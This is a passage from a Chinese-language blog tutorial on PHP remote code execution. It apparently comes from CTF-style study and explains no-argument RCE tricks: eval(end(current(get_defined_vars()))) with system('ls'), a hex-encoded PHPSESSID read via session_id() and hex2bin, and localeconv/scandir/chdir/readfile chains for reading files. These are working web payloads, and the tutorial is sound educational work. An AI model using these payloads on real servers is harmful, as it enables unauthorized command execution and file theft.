<p><code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d1c5281.png" alt="image-20240401221848316"></p>
<p>可以看到，它并不是获取的headers，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用GET方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<strong>current()<strong>函数，这个函数的作用是</strong>返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数</strong>，我们可以看看实际效果:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d0a282c.png" alt="image-20240401222003408"></p>
<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用**<code>end()</code>函数以字符串的形式取出最后的值**，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d273720.png" alt="image-20240401222138752"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d097103.png" alt="image-20240401222154762"></p>
<p>那我们把var_dump改成eval即可执行我们的phpinfo代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf49001.png" alt="image-20240401222220294"></p>
<p>那同样也能执行whoami命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d1350fe.png" alt="image-20240401222319324"></p>
<p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(end(current(get_defined_vars())));</span><br><span class="line">&amp;flag=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=system(&#x27;id&#x27;);</span><br><span class="line">eval(pos(pos(get_defined_vars())))</span><br></pre></td></tr></table></figure>





<h4 id="法3-2"><a href="#法3-2" class="headerlink" title="法3"></a>法3</h4><p>session_id()</p>
<p>简单来说就是<strong>把恶意代码写到COOKIE的PHPSESSID</strong>中，然后利用session_id()这个函数去读取它，返回一个字符串，然后我们就可以用eval去直接执行了，这里有一点要注意的就是session_id()要开启session才能用，所以说要先session_start()，这里我们先试着把PHPSESSID的值取出来：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d233292.png" alt="image-20240401222557307"></p>
<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将<strong>恶意代码16进制编码</strong>以后再插入进去，而在php中，<strong>将16进制转换为字符串的函数为<code>hex2bin</code></strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cda411d.png" alt="image-20240401222635617"></p>
<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，同时我们还要加上hex2bin函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d1a2a51.png" alt="image-20240401222701625"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_star())))</span><br><span class="line">cookie:PHPSESSIID=706870696e666f28293b     phpinfo();</span><br></pre></td></tr></table></figure>





<h4 id="法4-1"><a href="#法4-1" class="headerlink" title="法4"></a>法4</h4><p><strong>php函数直接读取文件</strong></p>
<p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p>
<h5 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h5><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组</p>
<p>我们在代码中将<code>localeconv()</code>的返回结果输出出来，它返回的是一个二维数组，而它的第一位居然是一个点.</p>
<p>那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf1dd7e.png" alt="image-20240401223458115"></p>
<p>我们利用current函数把这个点取出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d177d59.png" alt="image-20240401223536322"></p>
<p>完成目录遍历操作</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cfb1d0f.png" alt="image-20240401223600546"></p>
<h5 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h5><p>scandir() 函数返回指定目录中的文件和目录的数组。</p>
<h5 id="current-pos"><a href="#current-pos" class="headerlink" title="current(pos)"></a>current(pos)</h5><p>pos()函数是current()函数的别名，两者是一样的</p>
<p>current() 函数返回数组中的当前元素（单元）。</p>
<p>每个数组中都有一个内部的指针指向它“当前的”元素，初始指向插入到数组中的第一个元素。</p>
<h5 id="dirname-和chdir"><a href="#dirname-和chdir" class="headerlink" title="dirname()和chdir()"></a>dirname()和chdir()</h5><p>chadir()这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为scandir()会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用chdir切就好了，如果要向上跳就要构造chdir(‘..’)</p>
<p>首先我们可以利用getcwd()获取当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure>



<p>那么怎么进行当前目录的目录遍历呢？<br>这里用scandir()即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure>



<p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用dirname()即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure>



<p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure>

<p>将 PHP 的当前目录改为 directory。<br>所以我们这里在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure>

<p> 进行如下设置即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure>

<p>我们尝试读取&#x2F;var&#x2F;www&#x2F;123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>

<p>即可进行文件读取</p>
<h5 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h5><p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p>
<p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()</p>
<h5 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h5><p>取文件的打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/')">远程命令执行</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=远程命令执行&amp;url=http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/web/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web<span class="tagsPageCount">7</span></a><a class="post-meta__box__tags" href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>后端漏洞<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">LDAP注入</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/" title="LDAP注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">LDAP注入</div></div></a></div><div><a href="/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">php反序列化</div></div></a></div><div><a href="/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">pickle反序列化</div></div></a></div><div><a href="/2024/05/13/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">SQL注入</div></div></a></div><div><a href="/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="MD5长度拓展攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">MD5长度拓展攻击</div></div></a></div><div><a href="/2024/05/13/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">反弹shell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">1.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">系统命令执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">代码执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="toc-number">1.4.1.</span> <span class="toc-text">管道符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.2.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.3.</span> <span class="toc-text">关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.</span> <span class="toc-text">其他绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cat%E6%9B%BF%E6%8D%A2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">cat替换命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">回溯绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.5.</span> <span class="toc-text">分号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.6.</span> <span class="toc-text">数组绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.5.</span> <span class="toc-text">取反绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.6.</span> <span class="toc-text">异或绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.7.</span> <span class="toc-text">或绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.8.</span> <span class="toc-text">自增绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%9A"><span class="toc-number">1.4.9.</span> <span class="toc-text">输出重定向：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE"><span class="toc-number">1.5.</span> <span class="toc-text">无字母数字RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">例1：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%951"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%952"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%953"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">法3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2-%E8%BF%9B%E9%98%B6-%EF%BC%9A"><span class="toc-number">1.5.2.</span> <span class="toc-text">例2(进阶)：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7%E4%B8%8B%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B3"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">PHP7下简单解决</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP5%E4%B8%8B%E7%90%86%E8%A7%A3"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">PHP5下理解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP5%E4%B8%8B%E6%80%9D%E8%80%83"><span class="toc-number">1.5.2.2.1.</span> <span class="toc-text">PHP5下思考</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP5-shell%E6%89%93%E7%A0%B4%E7%A6%81%E9%94%A2"><span class="toc-number">1.5.2.2.2.</span> <span class="toc-text">PHP5+shell打破禁锢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glob%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">1.5.2.2.3.</span> <span class="toc-text">深入理解glob通配符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0POC-%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.5.2.2.4.</span> <span class="toc-text">构造POC 执行任意命令</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6RCE"><span class="toc-number">1.6.</span> <span class="toc-text">限制长度RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E5%AD%97%E7%AC%A6%E4%B8%8B%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text">15字符下可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E5%AD%97%E7%AC%A6%E4%B8%8B%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.6.2.</span> <span class="toc-text">7字符下可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E5%AD%97%E7%AC%A6%E4%B8%8B%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.6.3.</span> <span class="toc-text">5字符下可控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%951-1"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%952-1"><span 